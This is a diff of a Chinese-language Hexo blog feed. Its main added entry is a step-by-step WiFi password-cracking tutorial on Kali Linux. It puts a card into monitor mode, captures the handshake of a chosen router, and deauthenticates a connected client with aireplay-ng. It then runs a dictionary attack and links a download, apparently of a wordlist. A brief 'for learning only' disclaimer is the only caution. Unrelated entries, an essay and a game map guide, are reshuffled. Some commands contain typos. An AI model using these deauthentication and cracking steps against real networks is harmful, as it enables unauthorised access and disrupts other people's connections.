+<p>kali是什么？<br> ——kali就是一个专门用于渗透行业的Linux发行版本，里面的工具非常丰富，本文就是建立在kali系统的支持之上的</p>
+<p><a href="https://www.kali.org/get-kali/#kali-virtual-machines">https://www.kali.org/get-kali/#kali-virtual-machines</a></p>
+<p>下载了vm文件后可以直接用VMware打开，开机后<br> <strong>用户名：kali<br> 密码：kali</strong></p>
+<span id="more"></span>
 
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/blog/images/8.jpg" alt="8"></p>
+<h2 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a>正式开始</h2><h3 id="查看已安装网卡"><a href="#查看已安装网卡" class="headerlink" title="查看已安装网卡"></a>查看已安装网卡</h3><p>以下的操作都需要提升权限，默认的root密码都是kali</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#提升权限</span><br><span class="line">sudo su</span><br><span class="line">#查看网卡</span><br><span class="line">airmon-ng</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210428371.png"><br> 如果没有，请注意是否开启了网卡在虚拟机的连接，如下图<br><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210430334.png"></p>
+<p>打开一个终端窗口</p>
+<h3 id="开启网卡监控"><a href="#开启网卡监控" class="headerlink" title="开启网卡监控"></a>开启网卡监控</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#开启网卡监控</span><br><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431501.png"><br> 可以使用命令看看网卡的名字是否改变</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431574.png"><br> 可以看到最后的那个名字已经改变</p>
+<h3 id="扫描wifi"><a href="#扫描wifi" class="headerlink" title="扫描wifi"></a>扫描wifi</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure>
+
+<p>我们选择这个名叫adcd的wifi进行破解<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431426.png"></p>
+<h3 id="等待抓取握手包"><a href="#等待抓取握手包" class="headerlink" title="等待抓取握手包"></a>等待抓取握手包</h3><p>上述方法后，按<code>ctrl+c</code>，退出扫描</p>
+<p>输入命令</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">airodump-ng -w freedom -c <span class="number">11</span> --bssid 9C:2E:A1:<span class="number">20</span>:<span class="number">65</span>:BC wlan0mon -ignore-nefative-oneaa</span><br></pre></td></tr></table></figure>
+
+<p>-c：指定信道<br> -w：指定抓去握手包的存放位置或者名字，freedom是一会抓去的握手包的名字<br> –bssid：指定路由器的MAC</p>
+<p>需要更改两个参数，信道和地址，这两个参数分别是扫描wifi时确定要破解的wifi参数</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210431403.png">]</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432076.png"><br> 回车后，如下界面<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432332.png"><br> 从这个界面可以看出，选定的wifi一共有一个人连接，没有人连接的wifi是无法破解的</p>
+<h3 id="爆破-抓取握手包"><a href="#爆破-抓取握手包" class="headerlink" title="爆破 抓取握手包"></a>爆破 抓取握手包</h3><p>这个步骤，说白了，就是将一个用户踢下线，让他重新连接WIFI，这样我们就能监听并且截取到握手包</p>
+<p>重启一个终端窗口，一样的，申请管理员权限，密码默认：kali</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>
+
+<p>执行如下命令，同样的，需要输入上一步的两个参数，一个客户机的MAC，和路由器的MAC</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">aireplay-ng -<span class="number">0</span> <span class="number">2</span> -a 9C:2E:A1:<span class="number">20</span>:<span class="number">65</span>:BC -c A4:<span class="number">50</span>:<span class="number">46</span>:D8:<span class="number">74</span>:<span class="number">29</span> wlan0mon</span><br></pre></td></tr></table></figure>
+
+<p>-a：指定路由器的MAC<br> -c：指定客户机的MAC</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432483.png"><br> 执行成功后如上图，表明该客户机以及被成功的踢下线，我们要做的就是等待客户机重新连接，他只要重新连接了，我们就能抓到握手包，进行跑字典破解</p>
+<h3 id="抓取成功"><a href="#抓取成功" class="headerlink" title="抓取成功"></a>抓取成功</h3><p>当第四步的终端窗口出现如下<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432057.png"><br> 表明成功抓取到握手包，进行下一个步骤<br> <strong>注意！！这里抓到包一定要按<code>ctrl+c</code>退出抓包，不然抓到的握手包用不了哦</strong></p>
+<h3 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h3><p>包在<code>**/home/kali/**</code>文件夹下，找到名叫<code>freedom-01.ivs</code>文件，这个就是抓到的包</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432141.png"><br> 然后就是字典，我个人建议将字典一同放在该目录下<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432350.png"><br> 然后再次重起一个终端窗口，输入如下命令</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ircrack-ng -w pass.txt freedom-*.ivs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432497.png"><br> 回车开始解密<br> <img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210432365.png"><br> <strong>能否成功看字典的是否强大，也看脸</strong></p>
+<p>成功界面<br><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210433429.png"><br> 失败界面<br><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210433725.png"></p>
+<h2 id="温馨提示"><a href="#温馨提示" class="headerlink" title="温馨提示"></a>温馨提示</h2><hr>
+<p><strong>kali学的好，牢饭少不了<br> 本教程仅用于学习，请大家谨慎使用</strong></p>
+<p>需要的还是度盘自提吧：<br>链接：<a href="https://pan.baidu.com/s/1hehIiGnrArFiXVkIjEudcw">https://pan.baidu.com/s/1hehIiGnrArFiXVkIjEudcw</a><br>提取码：lbxk</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202209210436725.png"></p>
 ]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
       <tags>
-        <tag>随心</tag>
+        <tag>kali</tag>
       </tags>
   </entry>
   <entry>
@@ -1513,6 +1500,19 @@
       </categories>
       <tags>
         <tag>Win</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>愿你编码半生，归来仍是少年</title>
+    <url>/2019/10/21/%E6%84%BF%E4%BD%A0%E7%BC%96%E7%A0%81%E5%8D%8A%E7%94%9F%EF%BC%8C%E5%BD%92%E6%9D%A5%E4%BB%8D%E6%98%AF%E5%B0%91%E5%B9%B4/</url>
+    <content><![CDATA[<h4 id="Hello-World-不巧，我也在等你。"><a href="#Hello-World-不巧，我也在等你。" class="headerlink" title="Hello,World.不巧，我也在等你。"></a>Hello,World.不巧，我也在等你。</h4><p>​      有人说自己被社会磨平了棱角，泯灭了心性，受生活所迫，“都说是为生活所迫，生活缺从来没有被抓过；都说被社会磨去棱角，社会之恶至今无法逃脱”，我们都有权利选择自己想成为的人，并不是由社会说了算，我们都曾年少，我们都曾有棱角，社会的熔炉却在不断的炼化我们，到底是磨平了棱角，还是磨成了钢刀，就让时间来见证吧！</p>
+<p>​      常年混迹于各大网络社区，也曾愤青，如今独爱云淡风轻，只愿在滚滚红尘中揽得风花雪月独醉。</p>
+<h4 id="感谢你的到来。"><a href="#感谢你的到来。" class="headerlink" title="感谢你的到来。"></a>感谢你的到来。</h4><span id="more"></span>
+
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/blog/images/8.jpg" alt="8"></p>
+]]></content>
+      <tags>
+        <tag>随心</tag>
       </tags>
   </entry>
   <entry>
@@ -1751,6 +1751,51 @@
       </tags>
   </entry>
   <entry>
+    <title>热血传奇幻境迷宫、屠龙殿、圣域地图走法图解</title>
+    <url>/2022/08/31/%E7%83%AD%E8%A1%80%E4%BC%A0%E5%A5%87%E5%B9%BB%E5%A2%83%E8%BF%B7%E5%AE%AB%E3%80%81%E5%B1%A0%E9%BE%99%E6%AE%BF%E3%80%81%E5%9C%A3%E5%9F%9F%E5%9C%B0%E5%9B%BE%E8%B5%B0%E6%B3%95%E5%9B%BE%E8%A7%A3/</url>
+    <content><![CDATA[<p>小编精心总结了热血传奇幻境从幻境一层—幻境迷宫—幻境十层—屠龙殿—圣域之门地图的全部走法攻略，通过图文解说+参考视频进行了详尽的描述，愿可以帮助到您。</p>
+<h2 id="热血传奇幻境一层走法："><a href="#热血传奇幻境一层走法：" class="headerlink" title="热血传奇幻境一层走法："></a>热血传奇幻境一层走法：</h2><p>从幻境老人处花费金币进入。</p>
+<span id="more"></span>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310049612.jpeg" alt="img"></p>
+<h2 id="热血传奇幻境二层："><a href="#热血传奇幻境二层：" class="headerlink" title="热血传奇幻境二层："></a>热血传奇幻境二层：</h2><p>幻一地图左上角，坐标（12：11）</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310049678.jpeg" alt="img"></p>
+<h2 id="热血传奇幻境三层："><a href="#热血传奇幻境三层：" class="headerlink" title="热血传奇幻境三层："></a>热血传奇幻境三层：</h2><p>幻二地图右上角，坐标（362：230）</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310049989.jpeg" alt="img"></p>
+<h2 id="热血传奇幻境四层走法："><a href="#热血传奇幻境四层走法：" class="headerlink" title="热血传奇幻境四层走法："></a>热血传奇幻境四层走法：</h2><p>幻三一直向右走….</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310050797.jpeg" alt="img"></p>
+<p>坐标（83：83）点击幻境向导进入幻境四层</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310050225.jpeg" alt="img"></p>
+<h2 id="热血传奇幻境五层走法："><a href="#热血传奇幻境五层走法：" class="headerlink" title="热血传奇幻境五层走法："></a>热血传奇幻境五层走法：</h2><p>幻境四层地图右上角（191：123）进入</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310050461.jpeg" alt="img"></p>
+<h2 id="热血传奇幻境六层走法："><a href="#热血传奇幻境六层走法：" class="headerlink" title="热血传奇幻境六层走法："></a>热血传奇幻境六层走法：</h2><p>幻境五层地图下面坐标（38：228）进入</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310050589.jpeg" alt="img"></p>
+<h2 id="热血传奇幻境七层走法："><a href="#热血传奇幻境七层走法：" class="headerlink" title="热血传奇幻境七层走法："></a>热血传奇幻境七层走法：</h2><p>幻境六层地图坐标（82：26）走到这附近会跳出来古墓尸王，他出来的那个坑走进去就进入幻境七层了。</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310050736.jpeg" alt="img"></p>
+<h2 id="热血传奇幻境迷宫入口："><a href="#热血传奇幻境迷宫入口：" class="headerlink" title="热血传奇幻境迷宫入口："></a>热血传奇幻境迷宫入口：</h2><p>幻境七层地图左上角（121：12）进入。</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310051440.jpeg" alt="img"></p>
+<h2 id="幻境迷宫走法："><a href="#幻境迷宫走法：" class="headerlink" title="幻境迷宫走法："></a>幻境迷宫走法：</h2><h4 id="上——上——左——下——右——下，图中已标注具体方向。"><a href="#上——上——左——下——右——下，图中已标注具体方向。" class="headerlink" title="上——上——左——下——右——下，图中已标注具体方向。"></a>上——上——左——下——右——下，图中已标注具体方向。</h4><h2 id="热血传奇幻境八层走法："><a href="#热血传奇幻境八层走法：" class="headerlink" title="热血传奇幻境八层走法："></a>热血传奇幻境八层走法：</h2><p>幻境迷宫下一层进入</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310051118.jpeg" alt="img"></p>
+<h2 id="热血传奇幻境九层走法："><a href="#热血传奇幻境九层走法：" class="headerlink" title="热血传奇幻境九层走法："></a>热血传奇幻境九层走法：</h2><p>幻境八层左边（22：29）进入。</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310051707.jpeg" alt="img"></p>
+<h2 id="热血传奇幻境十层屠龙殿走法："><a href="#热血传奇幻境十层屠龙殿走法：" class="headerlink" title="热血传奇幻境十层屠龙殿走法："></a>热血传奇幻境十层屠龙殿走法：</h2><p>幻境九层地图中上的位置坐标（151：105）进入，如图所示。</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310051054.jpeg" alt="img"></p>
+<p>幻境十层屠龙殿…</p>
+<h2 id="热血传奇圣域之门入口："><a href="#热血传奇圣域之门入口：" class="headerlink" title="热血传奇圣域之门入口："></a>热血传奇圣域之门入口：</h2><p>在幻十地图最右边（370：374）点击NPC进入。</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310051114.jpeg" alt="img"></p>
+<h2 id="热血传奇圣域之门走法："><a href="#热血传奇圣域之门走法：" class="headerlink" title="热血传奇圣域之门走法："></a>热血传奇圣域之门走法：</h2><p>从幻十传送到圣域之门时坐标是随机的，这时候就需要用到随机传送卷了（如果有传送戒指更佳），将自己的坐标放到9：11周围，但不能在9：11上。</p>
+<p>如图，我将自己坐标放在了9：10上，这时我向下走一步就进到圣域教主的房间里了。</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310051458.jpeg" alt="img"></p>
+]]></content>
+      <categories>
+        <category>游戏</category>
+      </categories>
+      <tags>
+        <tag>传奇</tag>
+        <tag>攻略</tag>
+        <tag>幻境</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【疑难解答】 Office Tool Plus 入门教程</title>
     <url>/2022/09/27/%E7%96%91%E9%9A%BE%E8%A7%A3%E7%AD%94Office/</url>
     <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>如果你的系统本身就有诸多毛病，建议直接重装原版系统，这是最有效最快的解决办法。</p>
@@ -1879,51 +1924,6 @@
 ]]></content>
       <tags>
         <tag>Office</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>热血传奇幻境迷宫、屠龙殿、圣域地图走法图解</title>
-    <url>/2022/08/31/%E7%83%AD%E8%A1%80%E4%BC%A0%E5%A5%87%E5%B9%BB%E5%A2%83%E8%BF%B7%E5%AE%AB%E3%80%81%E5%B1%A0%E9%BE%99%E6%AE%BF%E3%80%81%E5%9C%A3%E5%9F%9F%E5%9C%B0%E5%9B%BE%E8%B5%B0%E6%B3%95%E5%9B%BE%E8%A7%A3/</url>
-    <content><![CDATA[<p>小编精心总结了热血传奇幻境从幻境一层—幻境迷宫—幻境十层—屠龙殿—圣域之门地图的全部走法攻略，通过图文解说+参考视频进行了详尽的描述，愿可以帮助到您。</p>
-<h2 id="热血传奇幻境一层走法："><a href="#热血传奇幻境一层走法：" class="headerlink" title="热血传奇幻境一层走法："></a>热血传奇幻境一层走法：</h2><p>从幻境老人处花费金币进入。</p>
-<span id="more"></span>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310049612.jpeg" alt="img"></p>
-<h2 id="热血传奇幻境二层："><a href="#热血传奇幻境二层：" class="headerlink" title="热血传奇幻境二层："></a>热血传奇幻境二层：</h2><p>幻一地图左上角，坐标（12：11）</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310049678.jpeg" alt="img"></p>
-<h2 id="热血传奇幻境三层："><a href="#热血传奇幻境三层：" class="headerlink" title="热血传奇幻境三层："></a>热血传奇幻境三层：</h2><p>幻二地图右上角，坐标（362：230）</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310049989.jpeg" alt="img"></p>
-<h2 id="热血传奇幻境四层走法："><a href="#热血传奇幻境四层走法：" class="headerlink" title="热血传奇幻境四层走法："></a>热血传奇幻境四层走法：</h2><p>幻三一直向右走….</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310050797.jpeg" alt="img"></p>
-<p>坐标（83：83）点击幻境向导进入幻境四层</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310050225.jpeg" alt="img"></p>
-<h2 id="热血传奇幻境五层走法："><a href="#热血传奇幻境五层走法：" class="headerlink" title="热血传奇幻境五层走法："></a>热血传奇幻境五层走法：</h2><p>幻境四层地图右上角（191：123）进入</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310050461.jpeg" alt="img"></p>
-<h2 id="热血传奇幻境六层走法："><a href="#热血传奇幻境六层走法：" class="headerlink" title="热血传奇幻境六层走法："></a>热血传奇幻境六层走法：</h2><p>幻境五层地图下面坐标（38：228）进入</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310050589.jpeg" alt="img"></p>
-<h2 id="热血传奇幻境七层走法："><a href="#热血传奇幻境七层走法：" class="headerlink" title="热血传奇幻境七层走法："></a>热血传奇幻境七层走法：</h2><p>幻境六层地图坐标（82：26）走到这附近会跳出来古墓尸王，他出来的那个坑走进去就进入幻境七层了。</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310050736.jpeg" alt="img"></p>
-<h2 id="热血传奇幻境迷宫入口："><a href="#热血传奇幻境迷宫入口：" class="headerlink" title="热血传奇幻境迷宫入口："></a>热血传奇幻境迷宫入口：</h2><p>幻境七层地图左上角（121：12）进入。</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310051440.jpeg" alt="img"></p>
-<h2 id="幻境迷宫走法："><a href="#幻境迷宫走法：" class="headerlink" title="幻境迷宫走法："></a>幻境迷宫走法：</h2><h4 id="上——上——左——下——右——下，图中已标注具体方向。"><a href="#上——上——左——下——右——下，图中已标注具体方向。" class="headerlink" title="上——上——左——下——右——下，图中已标注具体方向。"></a>上——上——左——下——右——下，图中已标注具体方向。</h4><h2 id="热血传奇幻境八层走法："><a href="#热血传奇幻境八层走法：" class="headerlink" title="热血传奇幻境八层走法："></a>热血传奇幻境八层走法：</h2><p>幻境迷宫下一层进入</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310051118.jpeg" alt="img"></p>
-<h2 id="热血传奇幻境九层走法："><a href="#热血传奇幻境九层走法：" class="headerlink" title="热血传奇幻境九层走法："></a>热血传奇幻境九层走法：</h2><p>幻境八层左边（22：29）进入。</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310051707.jpeg" alt="img"></p>
-<h2 id="热血传奇幻境十层屠龙殿走法："><a href="#热血传奇幻境十层屠龙殿走法：" class="headerlink" title="热血传奇幻境十层屠龙殿走法："></a>热血传奇幻境十层屠龙殿走法：</h2><p>幻境九层地图中上的位置坐标（151：105）进入，如图所示。</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310051054.jpeg" alt="img"></p>
-<p>幻境十层屠龙殿…</p>
-<h2 id="热血传奇圣域之门入口："><a href="#热血传奇圣域之门入口：" class="headerlink" title="热血传奇圣域之门入口："></a>热血传奇圣域之门入口：</h2><p>在幻十地图最右边（370：374）点击NPC进入。</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310051114.jpeg" alt="img"></p>
-<h2 id="热血传奇圣域之门走法："><a href="#热血传奇圣域之门走法：" class="headerlink" title="热血传奇圣域之门走法："></a>热血传奇圣域之门走法：</h2><p>从幻十传送到圣域之门时坐标是随机的，这时候就需要用到随机传送卷了（如果有传送戒指更佳），将自己的坐标放到9：11周围，但不能在9：11上。</p>
-<p>如图，我将自己坐标放在了9：10上，这时我向下走一步就进到圣域教主的房间里了。</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202208310051458.jpeg" alt="img"></p>
-]]></content>
-      <categories>
-        <category>游戏</category>
-      </categories>
-      <tags>
-        <tag>传奇</tag>
-        <tag>攻略</tag>
-        <tag>幻境</tag>
       </tags>
   </entry>
   <entry>
